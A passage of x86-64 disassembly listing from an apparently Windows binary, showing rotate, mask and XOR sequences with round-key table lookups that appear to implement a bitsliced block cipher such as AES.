   140003d29:	48 89 9d d0 0d 00 00 	mov    %rbx,0xdd0(%rbp)
   140003d30:	48 89 d8             	mov    %rbx,%rax
   140003d33:	48 c1 c0 28          	rol    $0x28,%rax
   140003d37:	48 21 f0             	and    %rsi,%rax
   140003d3a:	48 c1 c3 38          	rol    $0x38,%rbx
   140003d3e:	48 21 cb             	and    %rcx,%rbx
   140003d41:	48 09 c3             	or     %rax,%rbx
   140003d44:	48 89 bd 20 0d 00 00 	mov    %rdi,0xd20(%rbp)
   140003d4b:	48 89 f8             	mov    %rdi,%rax
   140003d4e:	48 c1 c0 28          	rol    $0x28,%rax
   140003d52:	48 21 f0             	and    %rsi,%rax
   140003d55:	49 89 fc             	mov    %rdi,%r12
   140003d58:	49 c1 c4 38          	rol    $0x38,%r12
   140003d5c:	49 21 cc             	and    %rcx,%r12
   140003d5f:	4c 8b 9d 80 08 00 00 	mov    0x880(%rbp),%r11
   140003d66:	4c 89 df             	mov    %r11,%rdi
   140003d69:	48 c1 c7 28          	rol    $0x28,%rdi
   140003d6d:	49 09 c4             	or     %rax,%r12
   140003d70:	4c 89 a5 b8 0d 00 00 	mov    %r12,0xdb8(%rbp)
   140003d77:	4d 89 dc             	mov    %r11,%r12
   140003d7a:	49 c1 c4 38          	rol    $0x38,%r12
   140003d7e:	48 21 f7             	and    %rsi,%rdi
   140003d81:	48 89 c8             	mov    %rcx,%rax
   140003d84:	49 21 cc             	and    %rcx,%r12
   140003d87:	49 09 fc             	or     %rdi,%r12
   140003d8a:	48 8b 8d 88 08 00 00 	mov    0x888(%rbp),%rcx
   140003d91:	48 89 cf             	mov    %rcx,%rdi
   140003d94:	48 c1 c7 28          	rol    $0x28,%rdi
   140003d98:	48 21 f7             	and    %rsi,%rdi
   140003d9b:	48 89 ce             	mov    %rcx,%rsi
   140003d9e:	48 c1 c6 38          	rol    $0x38,%rsi
   140003da2:	48 21 c6             	and    %rax,%rsi
   140003da5:	48 09 fe             	or     %rdi,%rsi
   140003da8:	4d 31 f2             	xor    %r14,%r10
   140003dab:	48 31 f1             	xor    %rsi,%rcx
   140003dae:	4c 89 d7             	mov    %r10,%rdi
   140003db1:	48 c1 c7 20          	rol    $0x20,%rdi
   140003db5:	48 8b 85 c0 0d 00 00 	mov    0xdc0(%rbp),%rax
   140003dbc:	48 33 7c c5 50       	xor    0x50(%rbp,%rax,8),%rdi
   140003dc1:	49 31 ce             	xor    %rcx,%r14
   140003dc4:	49 31 fe             	xor    %rdi,%r14
   140003dc7:	4c 89 b5 50 08 00 00 	mov    %r14,0x850(%rbp)
   140003dce:	48 8b bd d0 0c 00 00 	mov    0xcd0(%rbp),%rdi
   140003dd5:	4c 31 cf             	xor    %r9,%rdi
   140003dd8:	4d 31 ca             	xor    %r9,%r10
   140003ddb:	49 89 f9             	mov    %rdi,%r9
   140003dde:	49 c1 c1 20          	rol    $0x20,%r9
   140003de2:	4c 33 4c c5 58       	xor    0x58(%rbp,%rax,8),%r9
   140003de7:	49 31 ca             	xor    %rcx,%r10
   140003dea:	4d 31 ca             	xor    %r9,%r10
   140003ded:	4c 89 95 58 08 00 00 	mov    %r10,0x858(%rbp)
   140003df4:	4d 31 e8             	xor    %r13,%r8
   140003df7:	4c 31 ef             	xor    %r13,%rdi
   140003dfa:	4d 89 c1             	mov    %r8,%r9
   140003dfd:	49 c1 c1 20          	rol    $0x20,%r9
   140003e01:	4c 33 4c c5 60       	xor    0x60(%rbp,%rax,8),%r9
   140003e06:	4c 31 cf             	xor    %r9,%rdi
   140003e09:	4c 31 fa             	xor    %r15,%rdx
   140003e0c:	48 89 bd 60 08 00 00 	mov    %rdi,0x860(%rbp)
   140003e13:	49 89 d1             	mov    %rdx,%r9
   140003e16:	49 c1 c1 20          	rol    $0x20,%r9
   140003e1a:	4c 33 4c c5 68       	xor    0x68(%rbp,%rax,8),%r9
   140003e1f:	4d 31 f8             	xor    %r15,%r8
   140003e22:	49 31 c8             	xor    %rcx,%r8
   140003e25:	4d 31 c8             	xor    %r9,%r8
   140003e28:	4c 8b 8d d0 0d 00 00 	mov    0xdd0(%rbp),%r9
   140003e2f:	49 31 d9             	xor    %rbx,%r9
   140003e32:	4c 89 85 68 08 00 00 	mov    %r8,0x868(%rbp)
   140003e39:	4d 89 c8             	mov    %r9,%r8
   140003e3c:	4d 89 ca             	mov    %r9,%r10
   140003e3f:	49 c1 c0 20          	rol    $0x20,%r8
   140003e43:	48 31 da             	xor    %rbx,%rdx
   140003e46:	4c 33 44 c5 70       	xor    0x70(%rbp,%rax,8),%r8
   140003e4b:	48 31 ca             	xor    %rcx,%rdx
   140003e4e:	4c 31 c2             	xor    %r8,%rdx
   140003e51:	4c 8b 85 20 0d 00 00 	mov    0xd20(%rbp),%r8
   140003e58:	48 8b bd b8 0d 00 00 	mov    0xdb8(%rbp),%rdi
   140003e5f:	49 31 f8             	xor    %rdi,%r8
   140003e62:	48 89 95 70 08 00 00 	mov    %rdx,0x870(%rbp)
   140003e69:	4c 89 c2             	mov    %r8,%rdx
   140003e6c:	4d 89 c1             	mov    %r8,%r9
   140003e6f:	48 c1 c2 20          	rol    $0x20,%rdx
   140003e73:	48 33 54 c5 78       	xor    0x78(%rbp,%rax,8),%rdx
   140003e78:	48 89 85 c0 0d 00 00 	mov    %rax,0xdc0(%rbp)
   140003e7f:	49 31 fa             	xor    %rdi,%r10
   140003e82:	49 31 d2             	xor    %rdx,%r10
   140003e85:	4c 89 95 78 08 00 00 	mov    %r10,0x878(%rbp)
   140003e8c:	4d 31 e3             	xor    %r12,%r11
   140003e8f:	4d 31 e1             	xor    %r12,%r9
   140003e92:	4c 89 da             	mov    %r11,%rdx
   140003e95:	48 c1 c2 20          	rol    $0x20,%rdx
   140003e99:	48 33 94 c5 80 00 00 	xor    0x80(%rbp,%rax,8),%rdx
   140003ea0:	00 
   140003ea1:	49 31 d1             	xor    %rdx,%r9
   140003ea4:	4c 89 8d 80 08 00 00 	mov    %r9,0x880(%rbp)
   140003eab:	49 31 f3             	xor    %rsi,%r11
   140003eae:	48 c1 c1 20          	rol    $0x20,%rcx
   140003eb2:	48 33 8c c5 88 00 00 	xor    0x88(%rbp,%rax,8),%rcx
   140003eb9:	00 
   140003eba:	49 31 cb             	xor    %rcx,%r11
   140003ebd:	4c 89 9d 88 08 00 00 	mov    %r11,0x888(%rbp)
   140003ec4:	48 8d 8d 50 08 00 00 	lea    0x850(%rbp),%rcx
   140003ecb:	e8 20 57 00 00       	call   0x1400095f0
   140003ed0:	48 8b 9d 50 08 00 00 	mov    0x850(%rbp),%rbx
   140003ed7:	4c 8b b5 58 08 00 00 	mov    0x858(%rbp),%r14
   140003ede:	4c 8b a5 60 08 00 00 	mov    0x860(%rbp),%r12
   140003ee5:	4c 8b ad 68 08 00 00 	mov    0x868(%rbp),%r13
   140003eec:	4c 8b 8d 70 08 00 00 	mov    0x870(%rbp),%r9
   140003ef3:	48 8b bd 78 08 00 00 	mov    0x878(%rbp),%rdi
   140003efa:	48 89 d8             	mov    %rbx,%rax
   140003efd:	48 c1 c0 24          	rol    $0x24,%rax
   140003f01:	48 ba 0f 00 0f 00 0f 	movabs $0xf000f000f000f,%rdx
   140003f08:	00 0f 00 
   140003f0b:	48 21 d0             	and    %rdx,%rax
   140003f0e:	48 89 d9             	mov    %rbx,%rcx
   140003f11:	48 c1 c1 34          	rol    $0x34,%rcx
   140003f15:	49 b8 f0 ff f0 ff f0 	movabs $0xfff0fff0fff0fff0,%r8
   140003f1c:	ff f0 ff 
   140003f1f:	4c 21 c1             	and    %r8,%rcx
   140003f22:	48 09 c1             	or     %rax,%rcx
   140003f25:	48 89 ce             	mov    %rcx,%rsi
   140003f28:	48 89 8d e0 0d 00 00 	mov    %rcx,0xde0(%rbp)
   140003f2f:	4c 89 f0             	mov    %r14,%rax
   140003f32:	48 c1 c0 24          	rol    $0x24,%rax
   140003f36:	48 21 d0             	and    %rdx,%rax
   140003f39:	4c 89 f1             	mov    %r14,%rcx
   140003f3c:	48 c1 c1 34          	rol    $0x34,%rcx
   140003f40:	4c 21 c1             	and    %r8,%rcx
   140003f43:	48 09 c1             	or     %rax,%rcx
   140003f46:	48 89 8d e8 0d 00 00 	mov    %rcx,0xde8(%rbp)
   140003f4d:	4c 89 e0             	mov    %r12,%rax
   140003f50:	48 c1 c0 24          	rol    $0x24,%rax
   140003f54:	48 21 d0             	and    %rdx,%rax
   140003f57:	4d 89 e2             	mov    %r12,%r10
   140003f5a:	49 c1 c2 34          	rol    $0x34,%r10
   140003f5e:	4d 21 c2             	and    %r8,%r10
   140003f61:	4c 89 ad 10 0d 00 00 	mov    %r13,0xd10(%rbp)
   140003f68:	4c 89 e9             	mov    %r13,%rcx
   140003f6b:	48 c1 c1 24          	rol    $0x24,%rcx
   140003f6f:	49 09 c2             	or     %rax,%r10
   140003f72:	4d 89 d7             	mov    %r10,%r15
   140003f75:	4c 89 95 00 0d 00 00 	mov    %r10,0xd00(%rbp)
   140003f7c:	4c 89 e8             	mov    %r13,%rax
   140003f7f:	48 c1 c0 34          	rol    $0x34,%rax
   140003f83:	48 21 d1             	and    %rdx,%rcx
   140003f86:	4c 21 c0             	and    %r8,%rax
   140003f89:	48 09 c8             	or     %rcx,%rax
   140003f8c:	48 89 85 e8 0c 00 00 	mov    %rax,0xce8(%rbp)
   140003f93:	4d 89 cd             	mov    %r9,%r13
   140003f96:	4c 89 8d 20 0d 00 00 	mov    %r9,0xd20(%rbp)
   140003f9d:	4c 89 c8             	mov    %r9,%rax
   140003fa0:	48 c1 c0 24          	rol    $0x24,%rax
   140003fa4:	48 21 d0             	and    %rdx,%rax
   140003fa7:	49 c1 c5 34          	rol    $0x34,%r13
   140003fab:	4d 21 c5             	and    %r8,%r13
   140003fae:	49 09 c5             	or     %rax,%r13
   140003fb1:	49 89 fa             	mov    %rdi,%r10
   140003fb4:	48 89 bd d0 0d 00 00 	mov    %rdi,0xdd0(%rbp)
   140003fbb:	48 89 f8             	mov    %rdi,%rax
   140003fbe:	48 c1 c0 24          	rol    $0x24,%rax
   140003fc2:	48 21 d0             	and    %rdx,%rax
   140003fc5:	49 c1 c2 34          	rol    $0x34,%r10
   140003fc9:	4d 21 c2             	and    %r8,%r10
   140003fcc:	4c 8b 8d 80 08 00 00 	mov    0x880(%rbp),%r9
   140003fd3:	4c 89 8d d0 0c 00 00 	mov    %r9,0xcd0(%rbp)
   140003fda:	4c 89 c9             	mov    %r9,%rcx
   140003fdd:	48 c1 c1 24          	rol    $0x24,%rcx
   140003fe1:	49 09 c2             	or     %rax,%r10
   140003fe4:	4c 89 95 b8 0d 00 00 	mov    %r10,0xdb8(%rbp)
   140003feb:	4c 89 c8             	mov    %r9,%rax
   140003fee:	48 c1 c0 34          	rol    $0x34,%rax
   140003ff2:	48 21 d1             	and    %rdx,%rcx
   140003ff5:	4c 21 c0             	and    %r8,%rax
   140003ff8:	48 09 c8             	or     %rcx,%rax
   140003ffb:	48 89 85 f0 0c 00 00 	mov    %rax,0xcf0(%rbp)
   140004002:	48 8b bd 88 08 00 00 	mov    0x888(%rbp),%rdi
   140004009:	48 89 f8             	mov    %rdi,%rax
   14000400c:	48 c1 c0 24          	rol    $0x24,%rax
   140004010:	48 21 d0             	and    %rdx,%rax
   140004013:	48 89 f9             	mov    %rdi,%rcx
   140004016:	48 c1 c1 34          	rol    $0x34,%rcx
   14000401a:	4c 21 c1             	and    %r8,%rcx
   14000401d:	48 89 ca             	mov    %rcx,%rdx
   140004020:	48 31 f3             	xor    %rsi,%rbx
   140004023:	48 89 9d c8 0c 00 00 	mov    %rbx,0xcc8(%rbp)
   14000402a:	48 89 d9             	mov    %rbx,%rcx
   14000402d:	48 c1 c1 18          	rol    $0x18,%rcx
   140004031:	48 09 c2             	or     %rax,%rdx
   140004034:	48 89 95 f8 0c 00 00 	mov    %rdx,0xcf8(%rbp)
   14000403b:	48 c1 c3 28          	rol    $0x28,%rbx
   14000403f:	48 ba ff 00 ff 00 ff 	movabs $0xff00ff00ff00ff,%rdx
   140004046:	00 ff 00 
   140004049:	48 21 d1             	and    %rdx,%rcx
   14000404c:	49 b8 00 ff 00 ff 00 	movabs $0xff00ff00ff00ff00,%r8
   140004053:	ff 00 ff 
   140004056:	4c 21 c3             	and    %r8,%rbx
   140004059:	48 09 cb             	or     %rcx,%rbx
   14000405c:	4c 33 b5 e8 0d 00 00 	xor    0xde8(%rbp),%r14
   140004063:	4c 89 b5 08 0d 00 00 	mov    %r14,0xd08(%rbp)
   14000406a:	4d 31 fc             	xor    %r15,%r12
   14000406d:	4c 89 f0             	mov    %r14,%rax
   140004070:	48 c1 c0 18          	rol    $0x18,%rax
   140004074:	48 21 d0             	and    %rdx,%rax
   140004077:	49 89 d7             	mov    %rdx,%r15
   14000407a:	4d 89 f2             	mov    %r14,%r10
   14000407d:	49 c1 c2 28          	rol    $0x28,%r10
   140004081:	4d 21 c2             	and    %r8,%r10
   140004084:	4c 89 e1             	mov    %r12,%rcx
   140004087:	48 c1 c1 18          	rol    $0x18,%rcx
   14000408b:	49 09 c2             	or     %rax,%r10
   14000408e:	4c 89 e6             	mov    %r12,%rsi
   140004091:	48 c1 c6 28          	rol    $0x28,%rsi
   140004095:	48 21 d1             	and    %rdx,%rcx
   140004098:	4c 21 c6             	and    %r8,%rsi
   14000409b:	48 09 ce             	or     %rcx,%rsi
   14000409e:	4c 8b 9d 10 0d 00 00 	mov    0xd10(%rbp),%r11
   1400040a5:	4c 33 9d e8 0c 00 00 	xor    0xce8(%rbp),%r11
   1400040ac:	48 8b 8d 20 0d 00 00 	mov    0xd20(%rbp),%rcx
   1400040b3:	4c 31 e9             	xor    %r13,%rcx
   1400040b6:	4c 89 d8             	mov    %r11,%rax
   1400040b9:	48 c1 c0 18          	rol    $0x18,%rax
   1400040bd:	48 21 d0             	and    %rdx,%rax
   1400040c0:	4d 89 d9             	mov    %r11,%r9
   1400040c3:	49 c1 c1 28          	rol    $0x28,%r9
   1400040c7:	4d 21 c1             	and    %r8,%r9
   1400040ca:	49 89 ce             	mov    %rcx,%r14
   1400040cd:	49 89 c8             	mov    %rcx,%r8
   1400040d0:	48 89 8d 20 0d 00 00 	mov    %rcx,0xd20(%rbp)
   1400040d7:	49 c1 c6 18          	rol    $0x18,%r14
   1400040db:	49 09 c1             	or     %rax,%r9
   1400040de:	49 c1 c0 28          	rol    $0x28,%r8
   1400040e2:	49 21 d6             	and    %rdx,%r14
   1400040e5:	48 b8 00 ff 00 ff 00 	movabs $0xff00ff00ff00ff00,%rax
   1400040ec:	ff 00 ff 
   1400040ef:	49 21 c0             	and    %rax,%r8
   1400040f2:	4d 09 f0             	or     %r14,%r8
   1400040f5:	48 8b 95 d0 0d 00 00 	mov    0xdd0(%rbp),%rdx
   1400040fc:	48 33 95 b8 0d 00 00 	xor    0xdb8(%rbp),%rdx
   140004103:	48 8b 8d d0 0c 00 00 	mov    0xcd0(%rbp),%rcx
   14000410a:	48 33 8d f0 0c 00 00 	xor    0xcf0(%rbp),%rcx
   140004111:	48 89 8d d0 0c 00 00 	mov    %rcx,0xcd0(%rbp)
   140004118:	49 89 d6             	mov    %rdx,%r14
   14000411b:	48 89 95 d0 0d 00 00 	mov    %rdx,0xdd0(%rbp)
   140004122:	49 c1 c6 18          	rol    $0x18,%r14
   140004126:	4d 21 fe             	and    %r15,%r14
   140004129:	48 c1 c2 28          	rol    $0x28,%rdx
   14000412d:	48 21 c2             	and    %rax,%rdx
   140004130:	49 89 cf             	mov    %rcx,%r15
   140004133:	49 c1 c7 18          	rol    $0x18,%r15
   140004137:	4c 09 f2             	or     %r14,%rdx
   14000413a:	49 89 ce             	mov    %rcx,%r14
   14000413d:	49 c1 c6 28          	rol    $0x28,%r14
   140004141:	48 b9 ff 00 ff 00 ff 	movabs $0xff00ff00ff00ff,%rcx
   140004148:	00 ff 00 
   14000414b:	49 21 cf             	and    %rcx,%r15
   14000414e:	49 21 c6             	and    %rax,%r14
   140004151:	4d 09 fe             	or     %r15,%r14
   140004154:	48 8b 85 c8 0c 00 00 	mov    0xcc8(%rbp),%rax
   14000415b:	48 33 85 e8 0d 00 00 	xor    0xde8(%rbp),%rax
   140004162:	4c 33 a5 e8 0c 00 00 	xor    0xce8(%rbp),%r12
   140004169:	4d 31 eb             	xor    %r13,%r11
   14000416c:	48 33 bd f8 0c 00 00 	xor    0xcf8(%rbp),%rdi
   140004173:	48 8b 8d e0 0d 00 00 	mov    0xde0(%rbp),%rcx
   14000417a:	48 31 f9             	xor    %rdi,%rcx
   14000417d:	48 31 f8             	xor    %rdi,%rax
   140004180:	49 31 fc             	xor    %rdi,%r12
   140004183:	49 31 fb             	xor    %rdi,%r11
   140004186:	49 89 fd             	mov    %rdi,%r13
   140004189:	48 c1 c7 18          	rol    $0x18,%rdi
   14000418d:	49 bf ff 00 ff 00 ff 	movabs $0xff00ff00ff00ff,%r15
   140004194:	00 ff 00 
   140004197:	4c 21 ff             	and    %r15,%rdi
   14000419a:	49 c1 c5 28          	rol    $0x28,%r13
   14000419e:	49 bf 00 ff 00 ff 00 	movabs $0xff00ff00ff00ff00,%r15
   1400041a5:	ff 00 ff 
   1400041a8:	4d 21 fd             	and    %r15,%r13
   1400041ab:	49 09 fd             	or     %rdi,%r13
   1400041ae:	48 8b bd c0 0d 00 00 	mov    0xdc0(%rbp),%rdi
   1400041b5:	48 33 9c fd 90 00 00 	xor    0x90(%rbp,%rdi,8),%rbx
   1400041bc:	00 
   1400041bd:	48 31 d9             	xor    %rbx,%rcx
   1400041c0:	48 89 8d 50 08 00 00 	mov    %rcx,0x850(%rbp)
   1400041c7:	4c 33 94 fd 98 00 00 	xor    0x98(%rbp,%rdi,8),%r10
   1400041ce:	00 
   1400041cf:	4c 31 d0             	xor    %r10,%rax
   1400041d2:	48 89 85 58 08 00 00 	mov    %rax,0x858(%rbp)
   1400041d9:	48 8b 8d 08 0d 00 00 	mov    0xd08(%rbp),%rcx
   1400041e0:	48 33 8d 00 0d 00 00 	xor    0xd00(%rbp),%rcx
   1400041e7:	48 33 b4 fd a0 00 00 	xor    0xa0(%rbp,%rdi,8),%rsi
   1400041ee:	00 
   1400041ef:	48 31 f1             	xor    %rsi,%rcx
   1400041f2:	48 89 8d 60 08 00 00 	mov    %rcx,0x860(%rbp)
   1400041f9:	4c 33 8c fd a8 00 00 	xor    0xa8(%rbp,%rdi,8),%r9
   140004200:	00 
   140004201:	4d 31 cc             	xor    %r9,%r12
   140004204:	4c 89 a5 68 08 00 00 	mov    %r12,0x868(%rbp)
   14000420b:	4c 33 84 fd b0 00 00 	xor    0xb0(%rbp,%rdi,8),%r8
   140004212:	00 
   140004213:	4d 31 c3             	xor    %r8,%r11
   140004216:	4c 89 9d 70 08 00 00 	mov    %r11,0x870(%rbp)
   14000421d:	48 8b 8d 20 0d 00 00 	mov    0xd20(%rbp),%rcx
   140004224:	48 33 8d b8 0d 00 00 	xor    0xdb8(%rbp),%rcx
   14000422b:	48 33 94 fd b8 00 00 	xor    0xb8(%rbp,%rdi,8),%rdx
   140004232:	00 
   140004233:	48 31 d1             	xor    %rdx,%rcx
   140004236:	48 89 8d 78 08 00 00 	mov    %rcx,0x878(%rbp)
   14000423d:	4c 33 b4 fd c0 00 00 	xor    0xc0(%rbp,%rdi,8),%r14
   140004244:	00 
   140004245:	48 8b 85 d0 0d 00 00 	mov    0xdd0(%rbp),%rax
   14000424c:	48 33 85 f0 0c 00 00 	xor    0xcf0(%rbp),%rax
   140004253:	4c 31 f0             	xor    %r14,%rax
   140004256:	48 89 85 80 08 00 00 	mov    %rax,0x880(%rbp)
   14000425d:	48 8b 85 d0 0c 00 00 	mov    0xcd0(%rbp),%rax
   140004264:	48 33 85 f8 0c 00 00 	xor    0xcf8(%rbp),%rax
   14000426b:	4c 33 ac fd c8 00 00 	xor    0xc8(%rbp,%rdi,8),%r13
   140004272:	00 
   140004273:	4c 31 e8             	xor    %r13,%rax
   140004276:	48 89 85 88 08 00 00 	mov    %rax,0x888(%rbp)
   14000427d:	48 8d 8d 50 08 00 00 	lea    0x850(%rbp),%rcx
   140004284:	e8 67 53 00 00       	call   0x1400095f0
   140004289:	4c 8b 85 50 08 00 00 	mov    0x850(%rbp),%r8
   140004290:	4c 89 c6             	mov    %r8,%rsi
   140004293:	48 c1 c6 30          	rol    $0x30,%rsi
   140004297:	4c 8b 8d 58 08 00 00 	mov    0x858(%rbp),%r9
   14000429e:	4d 89 cf             	mov    %r9,%r15
   1400042a1:	49 c1 c7 30          	rol    $0x30,%r15
   1400042a5:	4c 8b 95 60 08 00 00 	mov    0x860(%rbp),%r10
   1400042ac:	4c 89 d0             	mov    %r10,%rax
   1400042af:	48 c1 c0 30          	rol    $0x30,%rax
   1400042b3:	49 89 c3             	mov    %rax,%r11
   1400042b6:	48 89 85 d0 0d 00 00 	mov    %rax,0xdd0(%rbp)
   1400042bd:	48 8b 95 68 08 00 00 	mov    0x868(%rbp),%rdx
   1400042c4:	49 89 d6             	mov    %rdx,%r14
   1400042c7:	49 c1 c6 30          	rol    $0x30,%r14
   1400042cb:	48 8b 8d 80 08 00 00 	mov    0x880(%rbp),%rcx
   1400042d2:	48 89 c8             	mov    %rcx,%rax
   1400042d5:	48 c1 c0 30          	rol    $0x30,%rax
   1400042d9:	48 89 85 20 0d 00 00 	mov    %rax,0xd20(%rbp)
   1400042e0:	48 8b 9d 88 08 00 00 	mov    0x888(%rbp),%rbx
   1400042e7:	49 89 dc             	mov    %rbx,%r12
   1400042ea:	49 c1 c4 30          	rol    $0x30,%r12
   1400042ee:	49 31 f0             	xor    %rsi,%r8
   1400042f1:	4d 31 f9             	xor    %r15,%r9
   1400042f4:	4d 31 da             	xor    %r11,%r10
   1400042f7:	4c 31 f2             	xor    %r14,%rdx
   1400042fa:	48 31 c1             	xor    %rax,%rcx
   1400042fd:	4c 31 e3             	xor    %r12,%rbx
   140004300:	49 89 cb             	mov    %rcx,%r11
   140004303:	4c 31 e1             	xor    %r12,%rcx
   140004306:	4d 89 c4             	mov    %r8,%r12
   140004309:	4d 31 f8             	xor    %r15,%r8
   14000430c:	4d 89 d7             	mov    %r10,%r15
   14000430f:	4d 31 f2             	xor    %r14,%r10
   140004312:	48 8b 85 70 08 00 00 	mov    0x870(%rbp),%rax
   140004319:	49 89 c6             	mov    %rax,%r14
   14000431c:	49 c1 c6 30          	rol    $0x30,%r14
   140004320:	4c 31 f0             	xor    %r14,%rax
   140004323:	49 c1 c4 20          	rol    $0x20,%r12
   140004327:	49 89 d5             	mov    %rdx,%r13
   14000432a:	4c 31 f2             	xor    %r14,%rdx
   14000432d:	48 31 de             	xor    %rbx,%rsi
   140004330:	49 31 d8             	xor    %rbx,%r8
   140004333:	49 31 da             	xor    %rbx,%r10
   140004336:	48 31 da             	xor    %rbx,%rdx
   140004339:	48 c1 c3 20          	rol    $0x20,%rbx
   14000433d:	48 31 d9             	xor    %rbx,%rcx
   140004340:	4c 33 a4 fd d0 00 00 	xor    0xd0(%rbp,%rdi,8),%r12
   140004347:	00 
   140004348:	4c 31 e6             	xor    %r12,%rsi
   14000434b:	48 8b 9d 78 08 00 00 	mov    0x878(%rbp),%rbx
   140004352:	48 89 8d 88 08 00 00 	mov    %rcx,0x888(%rbp)
   140004359:	48 89 b5 50 08 00 00 	mov    %rsi,0x850(%rbp)
   140004360:	4c 89 ce             	mov    %r9,%rsi
   140004363:	48 c1 c6 20          	rol    $0x20,%rsi
   140004367:	48 33 b4 fd d8 00 00 	xor    0xd8(%rbp,%rdi,8),%rsi
   14000436e:	00 
   14000436f:	49 31 f0             	xor    %rsi,%r8
   140004372:	4c 89 85 58 08 00 00 	mov    %r8,0x858(%rbp)
   140004379:	49 c1 c7 20          	rol    $0x20,%r15
   14000437d:	4c 33 8d d0 0d 00 00 	xor    0xdd0(%rbp),%r9
   140004384:	4c 33 bc fd e0 00 00 	xor    0xe0(%rbp,%rdi,8),%r15
   14000438b:	00 
   14000438c:	4d 31 f9             	xor    %r15,%r9
   14000438f:	49 c1 c5 20          	rol    $0x20,%r13
   140004393:	4c 33 ac fd e8 00 00 	xor    0xe8(%rbp,%rdi,8),%r13
   14000439a:	00 
   14000439b:	4c 89 8d 60 08 00 00 	mov    %r9,0x860(%rbp)
   1400043a2:	4d 31 ea             	xor    %r13,%r10
   1400043a5:	4c 89 95 68 08 00 00 	mov    %r10,0x868(%rbp)
   1400043ac:	49 89 c0             	mov    %rax,%r8
   1400043af:	49 c1 c0 20          	rol    $0x20,%r8
   1400043b3:	4c 33 84 fd f0 00 00 	xor    0xf0(%rbp,%rdi,8),%r8
   1400043ba:	00 
   1400043bb:	4c 31 c2             	xor    %r8,%rdx
   1400043be:	49 89 d8             	mov    %rbx,%r8
   1400043c1:	49 c1 c0 30          	rol    $0x30,%r8
   1400043c5:	48 89 95 70 08 00 00 	mov    %rdx,0x870(%rbp)
   1400043cc:	4c 31 c3             	xor    %r8,%rbx
   1400043cf:	4c 31 c0             	xor    %r8,%rax
   1400043d2:	48 89 da             	mov    %rbx,%rdx
   1400043d5:	48 c1 c2 20          	rol    $0x20,%rdx
   1400043d9:	48 33 94 fd f8 00 00 	xor    0xf8(%rbp,%rdi,8),%rdx
   1400043e0:	00 
   1400043e1:	48 31 d0             	xor    %rdx,%rax
   1400043e4:	48 89 85 78 08 00 00 	mov    %rax,0x878(%rbp)
   1400043eb:	49 c1 c3 20          	rol    $0x20,%r11
   1400043ef:	48 33 9d 20 0d 00 00 	xor    0xd20(%rbp),%rbx
   1400043f6:	4c 33 9c fd 00 01 00 	xor    0x100(%rbp,%rdi,8),%r11
   1400043fd:	00 
   1400043fe:	4c 31 db             	xor    %r11,%rbx
   140004401:	48 89 9d 80 08 00 00 	mov    %rbx,0x880(%rbp)
   140004408:	48 33 8c fd 08 01 00 	xor    0x108(%rbp,%rdi,8),%rcx
   14000440f:	00 
   140004410:	48 83 c7 20          	add    $0x20,%rdi
   140004414:	48 89 bd c0 0d 00 00 	mov    %rdi,0xdc0(%rbp)
   14000441b:	49 bc 00 f0 00 f0 00 	movabs $0xf000f000f000f000,%r12
   140004422:	f0 00 f0 
   140004425:	48 8d b5 50 08 00 00 	lea    0x850(%rbp),%rsi
   14000442c:	e9 df f4 ff ff       	jmp    0x140003910
   140004431:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004438:	0f 1f 84 00 00 00 00 
   14000443f:	00 
   140004440:	4c 89 d8             	mov    %r11,%rax
   140004443:	48 c1 e8 08          	shr    $0x8,%rax
   140004447:	4c 31 d8             	xor    %r11,%rax
   14000444a:	49 ba 00 00 ff 00 00 	movabs $0xff000000ff0000,%r10
   140004451:	00 ff 00 
   140004454:	4c 21 d0             	and    %r10,%rax
   140004457:	48 89 c1             	mov    %rax,%rcx
   14000445a:	48 c1 e1 08          	shl    $0x8,%rcx
   14000445e:	48 09 c1             	or     %rax,%rcx
   140004461:	4c 31 d9             	xor    %r11,%rcx
   140004464:	48 89 8d 50 08 00 00 	mov    %rcx,0x850(%rbp)
   14000446b:	4c 89 f0             	mov    %r14,%rax
   14000446e:	48 c1 e8 08          	shr    $0x8,%rax
   140004472:	4c 31 f0             	xor    %r14,%rax
   140004475:	4c 21 d0             	and    %r10,%rax
   140004478:	48 89 c1             	mov    %rax,%rcx
   14000447b:	48 c1 e1 08          	shl    $0x8,%rcx
   14000447f:	48 09 c1             	or     %rax,%rcx
   140004482:	4c 31 f1             	xor    %r14,%rcx
   140004485:	48 89 8d 58 08 00 00 	mov    %rcx,0x858(%rbp)
   14000448c:	4c 89 c8             	mov    %r9,%rax
   14000448f:	48 c1 e8 08          	shr    $0x8,%rax
   140004493:	4c 31 c8             	xor    %r9,%rax
   140004496:	4c 21 d0             	and    %r10,%rax
   140004499:	48 89 c1             	mov    %rax,%rcx
   14000449c:	48 c1 e1 08          	shl    $0x8,%rcx
   1400044a0:	48 09 c1             	or     %rax,%rcx
   1400044a3:	4c 31 c9             	xor    %r9,%rcx
   1400044a6:	48 89 8d 60 08 00 00 	mov    %rcx,0x860(%rbp)
   1400044ad:	4c 89 c0             	mov    %r8,%rax
   1400044b0:	48 c1 e8 08          	shr    $0x8,%rax
   1400044b4:	4c 31 c0             	xor    %r8,%rax
   1400044b7:	4c 21 d0             	and    %r10,%rax
   1400044ba:	48 89 c1             	mov    %rax,%rcx
   1400044bd:	48 c1 e1 08          	shl    $0x8,%rcx
   1400044c1:	48 09 c1             	or     %rax,%rcx
   1400044c4:	4c 31 c1             	xor    %r8,%rcx
   1400044c7:	48 89 8d 68 08 00 00 	mov    %rcx,0x868(%rbp)
   1400044ce:	48 89 d0             	mov    %rdx,%rax
   1400044d1:	48 c1 e8 08          	shr    $0x8,%rax
   1400044d5:	48 31 d0             	xor    %rdx,%rax
   1400044d8:	4c 21 d0             	and    %r10,%rax
   1400044db:	48 89 c1             	mov    %rax,%rcx
   1400044de:	48 c1 e1 08          	shl    $0x8,%rcx
   1400044e2:	48 09 c1             	or     %rax,%rcx
   1400044e5:	48 31 d1             	xor    %rdx,%rcx
   1400044e8:	48 89 8d 70 08 00 00 	mov    %rcx,0x870(%rbp)
   1400044ef:	48 89 d8             	mov    %rbx,%rax
   1400044f2:	48 c1 e8 08          	shr    $0x8,%rax
   1400044f6:	48 31 d8             	xor    %rbx,%rax
   1400044f9:	4c 21 d0             	and    %r10,%rax
   1400044fc:	48 89 c1             	mov    %rax,%rcx
   1400044ff:	48 c1 e1 08          	shl    $0x8,%rcx
   140004503:	48 09 c1             	or     %rax,%rcx
   140004506:	48 31 d9             	xor    %rbx,%rcx
   140004509:	48 89 8d 78 08 00 00 	mov    %rcx,0x878(%rbp)
